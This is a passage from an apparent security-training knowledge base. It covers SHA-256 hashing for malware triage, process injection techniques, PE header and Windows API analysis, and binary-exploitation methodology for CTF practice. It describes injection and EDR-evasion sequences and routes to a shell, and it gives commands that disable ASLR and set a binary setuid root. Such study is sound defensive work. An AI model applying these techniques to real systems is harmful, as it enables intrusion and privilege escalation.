certutil -hashfile FileName.exe SHA256
\`\`\`

### Linux / macOS
\`\`\`bash
# Standard
sha256sum FileName.exe

# macOS
shasum -a 256 FileName.exe

# OpenSSL
openssl dgst -sha256 FileName.exe
\`\`\`

---

## 2. What is SHA-256?

- **SHA-256** (Secure Hash Algorithm 256-bit) is part of the SHA-2 family designed by the NSA
- Produces a **256-bit** (64 hex character) hash
- Published by NIST in 2001
- **No known collisions** — cryptographically secure as of 2025
- Used in Bitcoin, SSL/TLS certificates, digital signatures, and malware identification

### Example Output
\`\`\`
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  empty_file.txt
2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  hello.txt
9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  malware_sample.exe
\`\`\`

---

## 3. SHA-256 — The Authoritative Identifier

SHA-256 is the **primary hash** used across the entire threat intelligence ecosystem:

| Platform / Tool | Primary Hash | Notes |
|---|---|---|
| **VirusTotal** | SHA-256 | Primary lookup key, URL format uses SHA-256 |
| **MISP** | SHA-256 | Threat intelligence sharing standard |
| **YARA** | SHA-256 | Hash matching in rules |
| **MalwareBazaar** | SHA-256 | Primary identifier in API |
| **ClamAV** | SHA-256 | Signature database |
| **STIX/TAXII** | SHA-256 | Standard IOC indicator |
| **Sigma rules** | SHA-256 | File hash detection |

---

## 4. Complete Hashing Workflow for Malware Analysis

### Step 1: Generate All Hashes
\`\`\`bash
# Generate MD5, SHA-1, and SHA-256 in one go
echo "=== File Identification ==="
echo "Filename: $(basename malware.exe)"
echo "Size:     $(stat -c %s malware.exe) bytes"
echo "MD5:      $(md5sum malware.exe | awk '{print $1}')"
echo "SHA-1:    $(sha1sum malware.exe | awk '{print $1}')"
echo "SHA-256:  $(sha256sum malware.exe | awk '{print $1}')"
echo "File:     $(file malware.exe)"
\`\`\`

### Step 2: VirusTotal Lookup
\`\`\`bash
# Direct URL format (open in browser)
# https://www.virustotal.com/gui/file/<SHA256_HASH>

# Using VT API (requires API key)
curl -s "https://www.virustotal.com/api/v3/files/<SHA256_HASH>" \\
  -H "x-apikey: YOUR_API_KEY" | python3 -m json.tool
\`\`\`

### Step 3: Automated Multi-Platform Lookup
\`\`\`python
#!/usr/bin/env python3
"""Quick hash lookup across multiple platforms"""
import hashlib
import sys

def hash_file(filepath):
    """Generate all hashes for a file"""
    md5 = hashlib.md5()
    sha1 = hashlib.sha1()
    sha256 = hashlib.sha256()
    
    with open(filepath, 'rb') as f:
        while chunk := f.read(8192):
            md5.update(chunk)
            sha1.update(chunk)
            sha256.update(chunk)
    
    return {
        'md5': md5.hexdigest(),
        'sha1': sha1.hexdigest(),
        'sha256': sha256.hexdigest()
    }

if __name__ == '__main__':
    hashes = hash_file(sys.argv[1])
    print(f"MD5:    {hashes['md5']}")
    print(f"SHA-1:  {hashes['sha1']}")
    print(f"SHA-256:{hashes['sha256']}")
    print(f"\\nVirusTotal: https://www.virustotal.com/gui/file/{hashes['sha256']}")
    print(f"MalwareBazaar: https://bazaar.abuse.ch/sample/{hashes['sha256']}/")
    print(f"Hybrid Analysis: https://www.hybrid-analysis.com/search?query={hashes['sha256']}")
\`\`\`

---

## 5. Hash Databases & Threat Intelligence

### Known-Good Hash Databases (Whitelisting)
| Database | Description |
|---|---|
| **NSRL** (NIST) | National Software Reference Library — hashes of known legitimate software |
| **HashSets.com** | Community hash sets for known files |
| **WinTriage** | Windows system file hashes |

### Known-Bad Hash Databases (Blacklisting)
| Database | URL | Description |
|---|---|---|
| **MalwareBazaar** | [bazaar.abuse.ch](https://bazaar.abuse.ch) | Community malware repo with SHA-256 |
| **MalShare** | [malshare.com](https://malshare.com) | Free samples by hash |
| **VirusShare** | [virusshare.com](https://virusshare.com) | Massive hash lists |
| **ThreatFox** | [threatfox.abuse.ch](https://threatfox.abuse.ch) | IOCs including hashes |

---

## 6. OSINT Hash Pivoting

When you have a SHA-256 hash, pivot to discover the full attack chain:

\`\`\`
SHA-256 Hash
    ├── VirusTotal "Relations" Tab
    │   ├── Contacted Domains → DNS history → related campaigns
    │   ├── Contacted IPs → geo-location → infrastructure mapping
    │   ├── Dropped Files → child payload hashes → next stages
    │   ├── Parent Files → dropper/loader that delivered this
    │   └── Execution Parents → process chain
    ├── MalwareBazaar
    │   ├── Family tags → malware family identification
    │   ├── Reporter → who submitted it
    │   └── Related samples → same campaign
    ├── ANY.RUN
    │   ├── Full behavioral report
    │   ├── Network traffic (PCAP)
    │   └── Process tree
    └── Hybrid Analysis
        ├── Sandbox report
        ├── Extracted strings
        └── MITRE ATT&CK mapping
\`\`\`

---

## 7. Verifying File Integrity

### Use Case: Verify a Download
\`\`\`bash
# Download a tool and verify its hash
wget https://example.com/tool.tar.gz
wget https://example.com/tool.tar.gz.sha256

# Verify
sha256sum -c tool.tar.gz.sha256
# Expected output: tool.tar.gz: OK
\`\`\`

### Use Case: Verify Evidence Integrity (Forensics)
\`\`\`bash
# At acquisition time
sha256sum disk_image.dd > evidence_hash.txt

# Before analysis
sha256sum -c evidence_hash.txt
# If OK → evidence is unmodified
# If FAILED → evidence was tampered with
\`\`\`

---

## 8. Hash Comparison Table

| Algorithm | Bits | Hex Chars | Collision Resistance | Speed | Use Case |
|---|---|---|---|---|---|
| **MD5** | 128 | 32 | **Broken** | Fastest | Quick lookups only |
| **SHA-1** | 160 | 40 | **Broken** (2017) | Fast | Legacy, avoid for security |
| **SHA-256** | 256 | 64 | **Strong** | Medium | Primary identifier (use this) |
| **SHA-512** | 512 | 128 | **Strong** | Slower | Maximum security needs |
| **SSDEEP** | Fuzzy | Variable | N/A (similarity) | Slow | Find similar (not identical) files |
| **TLSH** | Fuzzy | 72 | N/A (similarity) | Medium | Fuzzy matching malware variants |

---

## Pro Tips

> **Always use SHA-256 as your primary identifier** — It's the industry standard, all platforms accept it, and it's cryptographically secure.

> **Generate hashes BEFORE opening the file** — Opening in analysis tools might modify timestamps or trigger AV that quarantines the file.

> **Fuzzy hashes (SSDEEP/TLSH) complement exact hashes** — Use \`ssdeep -b malware_*.exe\` to find variants of the same malware family even when the SHA-256 is different.

> **Automate hashing in your workflow** — Create an alias: \`alias hashit='md5sum $1 && sha256sum $1 && ssdeep $1'\``,
  },
  {
    id: "process-injection",
    title: "PROCESS INJECTION",
    excerpt: "Comprehensive overview of process injection techniques including DLL injection, process hollowing, APC injection, and thread execution hijacking.",
    category: "Malware Analysis",
    content: `**Process injection** = the #1 most common technique used by modern Windows malware to **hide itself inside a legitimate process**.

Instead of running as its own obvious malicious evil.exe, the attacker forces a trusted process (e.g. explorer.exe, svchost.exe, msedge.exe, lsass.exe, etc.) to execute the malicious code. From the outside, everything looks normal — Task Manager, EDR, antivirus only see a legitimate process using a bit more memory or network.

### Why attackers do it (the real reasons in 2025)

|Goal|How injection helps|
|---|---|
|Evade AV/EDR|Legitimate process → often whitelisted|
|Steal tokens & escalate privileges|Inject into lsass → dump credentials|
|Survive reboots & hide|Live only in memory, nothing on disk|
|Bypass allow-lists|notepad.exe or Microsoft-signed binary now runs evil code|
|Hide network traffic|C2 comes from chrome.exe or svchost.exe|

### Top 8 Process Injection Techniques You Will See Daily (2025 ranking)

|#|Technique|How it works (very short)|Most common malware using it (2025)|Difficulty to detect|
|---|---|---|---|---|
|1|Classic DLL Injection|VirtualAllocEx → WriteProcessMemory → CreateRemoteThread (LoadLibrary)|Lumma, RedLine, SmokeLoader, most stealers|Low–Medium|
|2|Process Hollowing (RunPE)|Start legitimate exe suspended → unmap → write malicious PE → resume|Qakbot, TrickBot, Bumblebee, Dridex forks|Medium|
|3|Reflective DLL Injection|Malicious DLL has no LoadLibrary, it injects & executes itself in memory|Cobalt Strike, Brute Ratel, most red-team tools|High|
|4|Process Doppelgänging|Abuse NTFS transactions to load malicious PE without touching disk|Rare in commodity, some APT|Very High|
|5|Thread Execution Hijacking|Suspend legitimate thread → hollow its context → resume with malicious code|Emotet (old), some private crypters|High|
|6|APC Injection|Queue APC (asynchronous procedure call) to thread in target process|AsyncRAT, many .NET stealers|Medium|
|7|EarlyBird APC Injection|Queue APC while process is still suspended (before main thread runs)|Newer stealers & loaders|High|
|8|Direct Syscalls + NtMapViewOfSection|Map malicious section into another process (bypasses most EDR hooks)|Sliver, modern Cobalt forks, high-end malware|Very High|

### The Classic DLL Injection Step-by-Step (the one you see 50× per week)

1. Open target process (OpenProcess or NtOpenProcess)
2. Allocate memory in target (VirtualAllocEx)
3. Write malicious DLL path or shellcode (WriteProcessMemory)
4. Force target to load/run it (CreateRemoteThread → LoadLibrary or shellcode address)
5. Malicious code now runs inside explorer.exe, svchost.exe, etc.

### How to spot it instantly in your lab (2025)

|Tool|What you look for|
|---|---|
|PE-bear / CFF|Imports: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread|
|x64dbg|Breakpoints on those APIs → see if process handle ≠ itself|
|ProcMon|Process = explorer.exe doing WriteProcessMemory or LoadImage on weird DLL|
|Process Hacker|Right-click process → “Memory” tab → look for RX + W pages (shellcode) or weird DLLs|
|HollowsHunter / PE-sieve|Automatically flags hollowed processes & injected sections|
|Moneta / Hunt|Sysmon Event ID 8 (CreateRemoteThread) + Event ID 10 (memory access)|

### Quick verdict checklist (when you see a new sample)

|You see these imports →|Verdict|
|---|---|
|VirtualAllocEx + WriteProcessMemory + CreateRemoteThread|99% injection|
|Only Nt* versions of the above|Advanced injection (direct syscalls)|
|No suspicious imports but high network from svchost.exe|Reflective / memory-only injection|`,
  },
  {
    id: "pe-headers",
    title: "PE Header Analysis",
    excerpt: "Analyzing Portable Executable headers including DOS header, COFF header, optional header, section tables, Import Address Table, and detecting packed binaries.",
    category: "Malware Analysis",
    content: `# PE Header Analysis

> **Purpose**: Analyze the structure of Windows executables (PE format) to identify compilation details, packing, suspicious characteristics, and behavioral indicators — all before running the file.

---

## 1. Tools for PE Analysis

### Quick Setup
1. **PE-bear** — Open PE-bear → File → Load PEs → drop executable
2. **PEAnatomist** — Drop file into PEAnatomist for detailed timestamp and header analysis
3. **CFF Explorer** — Full PE editor with hex view and structure browser
4. **pestudio** — Automated PE analysis with threat indicators
5. **Detect It Easy (DiE)** — Packer/compiler detection, entropy visualization

### All Necessary Information
All header info, imports, resources, and debug info are visible on the main screen of PE-bear.

---

## 2. PE File Format Structure

\`\`\`
+-----------------------------+
|       DOS Header            |  <- Starts with "MZ" (0x4D 0x5A)
|       (64 bytes)            |
+-----------------------------+
|       DOS Stub              |  <- "This program cannot be run in DOS mode"
|       (Variable)            |
+-----------------------------+
|       PE Signature          |  <- "PE\\0\\0" (0x50 0x45 0x00 0x00)
+-----------------------------+
|       COFF File Header      |  <- Machine type, number of sections, timestamp
|       (20 bytes)            |
+-----------------------------+
|     Optional Header         |  <- Entry point, image base, subsystem
|     (PE32: 96 + data dirs)  |
|     (PE32+: 112 + data dirs)|
+-----------------------------+
|     Section Headers         |  <- .text, .data, .rdata, .rsrc, etc.
|     (40 bytes each)         |
+-----------------------------+
|     Section Data            |
|     .text (code)            |
|     .rdata (read-only data) |
|     .data (global vars)     |
|     .rsrc (resources)       |
|     .reloc (relocations)    |
+-----------------------------+
\`\`\`

---

## 3. DOS Header

- **MZ** on the blue screen or \`4D 5A\` on the white sheet (hex view) = it is an executable file
- The DOS header is a legacy structure from MS-DOS — the only important field is:
  - \`e_lfanew\` (offset 0x3C) -> points to the PE signature

### Quick Check
\`\`\`
If first 2 bytes = "MZ" (0x4D 0x5A) -> Valid PE file
If e_lfanew points to "PE\\0\\0" -> Valid PE header found
\`\`\`

---

## 4. COFF File Header (IMAGE_FILE_HEADER)

| Field | Offset | Meaning | Malware Relevance |
|---|---|---|---|
| **Machine** | 0x00 | Target architecture | \`0x14C\` = x86, \`0x8664\` = x64 |
| **NumberOfSections** | 0x02 | How many sections | Unusual count = suspicious |
| **TimeDateStamp** | 0x04 | Compilation timestamp | When was it compiled? Fake? Future? |
| **PointerToSymbolTable** | 0x08 | Symbol table offset | Usually 0 for release builds |
| **NumberOfSymbols** | 0x0C | Symbol count | Usually 0 |
| **SizeOfOptionalHeader** | 0x10 | Optional header size | Varies by PE32/PE32+ |
| **Characteristics** | 0x12 | File attributes | DLL flag, executable, etc. |

### Timestamp Analysis
\`\`\`
PEAnatomist -> File Header section -> TimeDateStamp

Things to check:
- Is the timestamp realistic? (not year 1970 or 2038)
- Is it in the future? (forgery)
- Does it match other samples in the campaign?
- Is it 0x00000000? (stripped)
- Epoch converter: https://www.epochconverter.com/
\`\`\`

---

## 5. Optional Header (Key Fields)

| Field | Meaning | Malware Relevance |
|---|---|---|
| **Magic** | \`0x10B\` = PE32, \`0x20B\` = PE32+ (64-bit) | Architecture identification |
| **AddressOfEntryPoint** | RVA where execution begins | Unusual location -> packed/injected |
| **ImageBase** | Preferred load address | Default: \`0x400000\` (exe), \`0x10000000\` (DLL) |
| **SectionAlignment** | Memory alignment | Usually \`0x1000\` (4KB) |
| **FileAlignment** | Disk alignment | Usually \`0x200\` (512 bytes) |
| **SizeOfImage** | Total memory size | Must match actual sections |
| **Subsystem** | GUI=2, Console=3, Driver=1 | What type of executable |
| **DllCharacteristics** | Security features | ASLR, DEP/NX, CFG, SEH flags |
| **NumberOfRvaAndSizes** | Data directory count | Usually 16 |

### DllCharacteristics Security Flags
| Flag | Value | Meaning |
|---|---|---|
| \`IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE\` | \`0x0040\` | ASLR enabled |
| \`IMAGE_DLLCHARACTERISTICS_NX_COMPAT\` | \`0x0100\` | DEP/NX enabled |
| \`IMAGE_DLLCHARACTERISTICS_NO_SEH\` | \`0x0400\` | No SEH (Structured Exception Handling) |
| \`IMAGE_DLLCHARACTERISTICS_GUARD_CF\` | \`0x4000\` | Control Flow Guard enabled |

> Malware with **no security flags** = compiled without protections (intentional or old compiler)

---

## 6. Section Headers (IMAGE_SECTION_HEADER)

### Standard Sections
| Section | Purpose | Expected Characteristics |
|---|---|---|
| \`.text\` | Executable code | \`IMAGE_SCN_MEM_EXECUTE\` + \`IMAGE_SCN_MEM_READ\` |
| \`.rdata\` | Read-only initialized data, imports | \`IMAGE_SCN_MEM_READ\` |
| \`.data\` | Read-write initialized data | \`IMAGE_SCN_MEM_READ\` + \`IMAGE_SCN_MEM_WRITE\` |
| \`.bss\` | Uninitialized data | \`IMAGE_SCN_MEM_READ\` + \`IMAGE_SCN_MEM_WRITE\` |
| \`.rsrc\` | Resources (icons, dialogs, version) | \`IMAGE_SCN_MEM_READ\` |
| \`.reloc\` | Relocation data (for ASLR) | \`IMAGE_SCN_MEM_READ\` |

### Suspicious Section Indicators
| Indicator | What It Means |
|---|---|
| Section with \`RWX\` (Read+Write+Execute) | Self-modifying code or shellcode unpacking |
| Unknown section names (\`.upx0\`, \`.aspack\`) | Known packer sections |
| Entry point outside \`.text\` section | Packed -- stub in different section |
| \`.text\` section is \`WRITE\`able | Self-modifying code |
| Very high entropy in a section (>7.0) | Compressed or encrypted content |
| Huge gap between VirtualSize and RawSize | Packer will expand data in memory |

---

## 7. Packed Binary Detection

- If the **size of raw data** is almost equal to the **virtual size** (IMAGE_SECTION_HEADER .text) then it is **not a packed binary**
- A **packed binary** is a normal Windows PE executable (.exe, .dll, .sys, etc.) that has been **compressed or encrypted** by a special tool called a **packer** (or **crypter/protector**)

### What Happens When You Run a Packed Binary
1. The packed file is very small or looks like random/garbage data
2. At runtime, a small piece of code (the **stub** or **unpacking stub**) executes first
3. This stub **decompresses or decrypts** the real original program in memory
4. The stub then jumps to the real program's original entry point (OEP) and the malware runs normally

### Packing Detection Checklist
\`\`\`
[ ] Virtual Size >> Raw Size for .text section? -> PACKED
[ ] Entry point in unusual section (not .text)? -> PACKED  
[ ] Very few imports (only LoadLibrary/GetProcAddress)? -> PACKED
[ ] Section names match known packers? -> PACKED
[ ] High entropy (>7.0) across sections? -> PACKED
[ ] Few/no meaningful strings? -> PACKED
[ ] Detect It Easy / PEiD identifies a packer? -> PACKED
\`\`\`

### Common Packers & Their Signatures
| Packer | Section Names | Other Indicators |
|---|---|---|
| **UPX** | \`.UPX0\`, \`.UPX1\` | \`UPX!\` magic at end of file |
| **ASPack** | \`.aspack\`, \`.adata\` | ASPack string in overlay |
| **Themida / WinLicense** | \`.themida\` | Virtualized code |
| **VMProtect** | \`.vmp0\`, \`.vmp1\` | Code virtualization |
| **PECompact** | \`.pec\`, PECompact header | PECompact2 string |
| **MPRESS** | \`.MPRESS1\`, \`.MPRESS2\` | Similar to UPX |
| **Enigma Protector** | \`.enigma1\`, \`.enigma2\` | Anti-debug, anti-dump |

---

## 8. Import Address Table (IAT) Analysis

The IAT lists all DLL functions the binary imports:

### What to Check
\`\`\`
PE-bear -> Imports tab
  -> Which DLLs are imported?
  -> Which functions from each DLL?
  -> Do the imports match the claimed functionality?
\`\`\`

### Red-Flag Import Patterns
| Pattern | Interpretation |
|---|---|
| Only \`kernel32.dll\` with \`LoadLibrary\` + \`GetProcAddress\` | Dynamic resolution -- hiding real imports |
| \`ws2_32.dll\` + \`wininet.dll\` imports | Network communication |
| \`crypt32.dll\` imports | Encryption/decryption |
| \`VirtualAllocEx\` + \`WriteProcessMemory\` | Process injection |
| No imports at all | Heavily packed or uses syscalls |
| \`ntdll.dll\` Nt* functions | Direct syscalls, EDR evasion |

---

## 9. Resources Section (.rsrc)

Resources can contain:
- **Icons** -- Social engineering (mimicking legitimate software)
- **Version info** -- Fake publisher, product name
- **Embedded binaries** -- Payloads hidden in resources
- **Configuration data** -- Encrypted C2 config
- **Dialogs** -- Ransom notes, fake error messages

### Tools for Resource Analysis
| Tool | Use |
|---|---|
| **Resource Hacker** | View/extract/edit all resources |
| **PE-bear** | Resources tab shows resource tree |
| **7-Zip** | Can open PE resources as archive |
| **binwalk** | Find embedded files in resources |

---

## 10. Data Directories

| Index | Name | Malware Relevance |
|---|---|---|
| 0 | Export Table | DLL exports (check for suspicious function names) |
| 1 | Import Table | IAT -- critical for behavior analysis |
| 2 | Resource Table | Embedded payloads, configs |
| 5 | Base Relocation | Needed for ASLR |
| 6 | Debug | PDB path -> developer machine info |
| 11 | Bound Import | Rarely used -- if present, suspicious |
| 12 | IAT | Runtime import resolution |
| 14 | CLR Runtime Header | .NET binary indicator |

### Debug Directory -- Developer Info Leak
\`\`\`
The PDB (Program Database) path can leak:
- Developer username
- Project folder structure
- Development machine OS  
- Build environment

Example: C:\\Users\\attackerName\\Desktop\\malware_project\\Release\\payload.pdb
\`\`\`

---

## 11. Quick PE Analysis Checklist

\`\`\`
[ ] 1. Verify MZ header (is it actually a PE file?)
[ ] 2. Check architecture (x86 vs x64)
[ ] 3. Read timestamp (when compiled?)
[ ] 4. Check entry point location (in .text? -> normal)
[ ] 5. Examine sections (names, sizes, entropy, permissions)
[ ] 6. Detect packing (VirtualSize vs RawSize, entropy, DiE)
[ ] 7. Analyze imports (which APIs? -> predict behavior)
[ ] 8. Check resources (embedded files? fake version info?)
[ ] 9. Look for debug info (PDB path leak?)
[ ] 10. Check DLL characteristics (security flags)
[ ] 11. Calculate hashes (MD5/SHA256) -> VirusTotal lookup
[ ] 12. Run through pestudio for automated indicators
\`\`\`

---

## Pro Tips

> **Use pestudio for automated first-pass** -- It highlights suspicious imports, strings, and sections with color-coded indicators. Best initial triage tool.

> **Entropy is your packing detector** -- Normal \`.text\` section: ~6.0 entropy. Packed/encrypted: ~7.5+. Use DiE for visual entropy graphs.

> **Fake timestamps are common** -- Malware authors often set timestamps to 0, far in the past, or match legitimate software timestamps. Never trust timestamps alone.

> **Resources hide payloads** -- Many malware families (Emotet, QakBot) embed encrypted payloads in the PE resource section, decoded at runtime.
`,
  },
  {
    id: "windows-api",
    title: "WINDOWS API",
    excerpt: "Reference guide for Windows API functions commonly encountered in malware analysis, covering kernel32.dll, ntdll.dll, and user32.dll function families.",
    category: "Malware Analysis",
    content: `The **Windows API** (Application Programming Interface) is simply the **official set of functions** that Microsoft provides so that programs (normal software and malware alike) can interact with the Windows operating system.

Think of it as the **only legal way** a program can ask Windows to do anything useful: create a file, start a process, open a network connection, press a key, hide a window, etc.

Every piece of Windows malware you will ever analyze uses the Windows API — there is no other way.

### 1. Where does the Windows API live?

| DLL (Dynamic Link Library)    | What it contains – most important for malware         |
| ----------------------------- | ----------------------------------------------------- |
| **kernel32.dll**              | File, process, thread, memory, handles – the core     |
| **user32.dll**                | Windows, messages, keyboard/mouse, GUI stuff          |
| **advapi32.dll**              | Registry, services, privileges, crypto                |
| **ntdll.dll**                 | Low-level NT system calls (the real kernel interface) |
| **ws2_32.dll / wininet.dll**  | Network: sockets, HTTP, DNS                           |
| **shell32.dll / shlwapi.dll** | Shell operations, file shortcuts, URLs                |
| **ole32.dll / oleaut32.dll**  | COM, automation, often used for Office macros         |
| **winhttp.dll**               | Modern HTTPS (common in 2024–2025 malware)            |
| **crypt32.dll**               | Certificate functions (often abused)                  |

### 2. Two ways programs call the Windows API

|Method|What you see in static analysis|What you see when running|
|---|---|---|
|**Dynamic linking** (99% of normal programs & most malware)|Clear Import Address Table (IAT) with function names: CreateFileA, WriteProcessMemory, RegSetValueEx, etc.|Easy to see in ProcMon, API monitors|
|**Dynamic / manual loading** (common evasion technique)|No imported names, or only LoadLibrary + GetProcAddress|At runtime it loads the DLL and resolves functions manually → hides real API usage from static tools|

### 3. The Most Important Windows API Functions You Will See in Malware (2025 hit list)

|Category|API Function|What malware uses it for|
|---|---|---|
|Process Injection|VirtualAllocEx, WriteProcessMemory, CreateRemoteThread|Classic DLL/code injection|
||NtMapViewOfSection, NtCreateThreadEx (ntdll)|Stealthier injection (direct syscalls)|
|Persistence|RegCreateKeyEx, RegSetValueEx|Writes to HKCU\\Run, HKLM\\Run, etc.|
||CreateService, StartService|Installs itself as service|
|File Operations|CreateFile, WriteFile, CopyFile|Drops payload, ransomware encryption|
||URLDownloadToFile, WinHttpOpen|Downloads next stage|
|Network|socket, connect, WSAConnect|Raw sockets (ws2_32)|
||InternetOpen, HttpOpenRequest|Old wininet style C2|
||WinHttpConnect, WinHttpSendRequest|Modern HTTPS C2 (2023–2025)|
|Anti-Analysis|IsDebuggerPresent, CheckRemoteDebuggerPresent|Detects if being debugged|
||NtQueryInformationProcess|ProcessDebugPort, ProcessDebugObjectHandle|
||GetTickCount, QueryPerformanceCounter → XOR check|Timing checks against sandboxes|
|Privilege Escalation|LookupPrivilegeValue, AdjustTokenPrivileges|Enables SeDebugPrivilege, SeImpersonate, etc.|
|Evasion|LoadLibrary, GetProcAddress|Dynamic API resolution (hides real functions)|
||NtOpenProcess, NtReadVirtualMemory|Direct syscall versions (bypasses API hooks)|
|Hiding|SetWindowsHookEx, RegisterHotKey|Keylogger or persistence|
||CreateMutex, OpenMutex|Singleton check (only one instance)|

### 4. How malware hides Windows API usage (2025 techniques)

|Technique|What it looks like in tools|
|---|---|
|Direct syscalls|Calls ntdll functions with syscall numbers instead of using kernel32|
|API hashing|Hashes function names at runtime, resolves via GetProcAddress|
|String encryption|All API and DLL names are encrypted/obfuscated|
|Reflective DLL injection|No LoadLibrary on disk, everything in memory|
|Syscall stubbing|Malware contains its own syscall stubs (e.g., Tartarus Gate, SysWhispers)|

### 5. Quick cheat sheet for daily malware analysis

When you open a sample in PE-bear, x64dbg, or IDA, ask yourself these questions:

1. Does it import suspicious APIs? → CreateRemoteThread + WriteProcessMemory = almost certainly injection
2. Does it only import LoadLibrary + GetProcAddress? → It’s doing dynamic resolution (common evasion)
3. Does it import a lot of Nt* functions from ntdll? → Probably doing direct syscalls to evade EDR hooks
4. Does it import networking APIs but no URLs visible? → Domain generation algorithm (DGA) or encrypted config
5. Does it import VirtualAlloc + CreateThread + WinHttp*? → Typical downloader → shellcode → next-stage pattern`,
  },
  {
    id: "binary-exploitation-methodology",
    title: "Binary Exploitation Methodology",
    excerpt: "Complete methodology for approaching binary exploitation challenges, from initial reconnaissance through vulnerability identification to working exploit development.",
    category: "Binary Exploitation",
    content: `# Binary Exploitation Methodology
> Sources: [HackTricks - Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html) | [Crypto-Cat CTF/pwn](https://github.com/Crypto-Cat/CTF/tree/main/pwn)

---

## Overview - Exploitation Flow

\`\`\`
1. Identify vulnerability (overflow, format string, etc.)
2. Determine protections (checksec)
3. Find offset to control EIP/RIP
4. Choose exploitation technique based on protections
5. Build payload & get shell
\`\`\`

---

## Step 1: Recon & Binary Analysis

\`\`\`bash
# Check binary protections
checksec --file=./binary

# File type
file ./binary

# Strings
strings ./binary | grep -i flag
strings ./binary | grep -i bin/sh

# Trace library/system calls
ltrace ./binary
strace ./binary

# Disassemble
objdump -d ./binary | less
\`\`\`

### ELF Basic Info
- **ELF** = Executable and Linkable Format (Linux binaries)
- Sections: \`.text\` (code), \`.data\` (initialized data), \`.bss\` (uninitialized), \`.got\` (Global Offset Table), \`.plt\` (Procedure Linkage Table)
- GOT/PLT used for dynamic linking → key targets for exploitation

---

## Step 2: Controlling Execution Flow

### Ways to hijack control flow:
1. **Stack Overflow** → overwrite saved return address (EIP/RIP)
2. **Format String** → arbitrary read/write via \`printf\` misuse
3. **Array Indexing** → abuse poorly bounds-checked indexing
4. **Integer Overflow** → cause unexpected allocation sizes → heap/stack overflow
5. **Heap Exploitation** → corrupt heap metadata for arbitrary write

---

## Step 3: Choose Exploitation Goal

### Goal A: Call an Existing Function (ret2win)
- No PIE, no canary → just overwrite return address with function address
- With PIE → need a PIE leak first
- With canary → need canary leak/bypass
- Need params? → use ROP gadgets or SROP

### Goal B: Remote Code Execution (RCE)

#### Via Shellcode (NX disabled):
- Place shellcode on stack → jump to it
- No ASLR → hardcode stack address
- With ASLR → use \`ret2esp\` / \`ret2reg\` gadgets
- With NX → use ROP to call \`mprotect()\` → make region executable → jump to shellcode

#### Via Syscall:
- \`ret2syscall\` → set up \`execve("/bin/sh", NULL, NULL)\` via ROP
- SROP → use \`sigreturn\` to set all registers at once

#### Via Libc (ret2libc):
- Call \`system("/bin/sh")\` using libc addresses
- No ASLR → static addresses
- With ASLR → leak libc address from GOT, calculate offsets
- Unknown libc? → leak 2+ function addresses → identify version via [libc.blukat.me](https://libc.blukat.me/) or [libc.rip](https://libc.rip/)

#### Via EBP/RBP (Stack Pivoting):
- Control ESP through stored EBP
- Useful for off-by-one overflows

---

## Step 4: Eternal Loops (Re-exploitation)

When one exploitation isn't enough:
- ROP chain back to \`main\` or vulnerable function
- Overwrite \`exit()\` GOT entry → point back to vulnerability
- Use \`.fini_array\` → store function pointer to loop back

---

## Compilation Flags for Practice

\`\`\`bash
# Compile with NO protections (for practice)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# 64-bit no protections
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# Set permissions for CTF-style challenges
sudo chown root:root flag.txt && sudo chmod 600 flag.txt
sudo chown root:root vuln && sudo chmod 4655 vuln

# Disable ASLR (for local testing)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`

---

## Quick Reference: Vulnerability → Technique

| Vulnerability | Protections | Technique |
|---|---|---|
| Stack BOF | None | ret2win / shellcode |
| Stack BOF | NX | ret2libc / ROP |
| Stack BOF | NX + ASLR | Leak libc → ret2libc |
| Stack BOF | NX + ASLR + PIE | Leak PIE base + libc → ROP |
| Stack BOF | NX + Canary | Leak/brute canary → ROP |
| Format String | Any | Arbitrary read/write → GOT overwrite |
| Heap Overflow | Any | Corrupt metadata → arbitrary write |
| Integer Overflow | Any | Trigger secondary vuln (BOF/heap) |

---

## References
- [HackTricks Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
- [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101) ([VIDEO Series](https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94))
- [Ir0nstone Notes](https://ir0nstone.gitbook.io/notes/types/stack)
- [Nightmare](https://guyinatuxedo.github.io/)
`,
  },
  {
    id: "intro-to-buffer-overflows",
    title: "Binary Exploitation 101 – Tools Setup & Key Commands",
    excerpt: "Introduction to buffer overflow vulnerabilities including tool setup, essential GDB commands, and understanding memory corruption fundamentals.",
    category: "Binary Exploitation",
    content: `# Binary Exploitation 101 – Tools Setup & Key Commands
> Sources: [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101) | [HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)

---

## The Exploitation Workflow (Overview)

\`\`\`
1. RECON          →  file, checksec, strings, ltrace, strace
2. FIND VULN      →  Ghidra/IDA decompile, spot unsafe functions
3. FIND OFFSET    →  cyclic pattern (pwntools / msf-pattern)
4. CONTROL EIP    →  Overwrite return address
5. EXPLOIT        →  ret2win / shellcode / ret2libc / ROP
6. PROFIT         →  Shell / flag
\`\`\`

---

## Essential Tools & Commands

### checksec — Binary Protection Audit
\`\`\`bash
checksec --file=./binary          # Single binary
checksec --dir=.                  # All binaries in directory
\`\`\`

**Output explained:**
\`\`\`
    Arch:     amd64-64-little       ← Architecture
    RELRO:    Full RELRO            ← GOT is read-only (can't overwrite GOT)
    Stack:    Canary found          ← Stack canary present (detects overflow)
    NX:       NX enabled            ← Stack is non-executable (no shellcode)
    PIE:      PIE enabled           ← Binary base randomized (ASLR for code)
\`\`\`

| Protection | OFF = Easy Exploit | ON = Need Bypass |
|---|---|---|
| **NX** | Shellcode on stack | ROP / ret2libc |
| **Canary** | Direct overflow | Leak canary first |
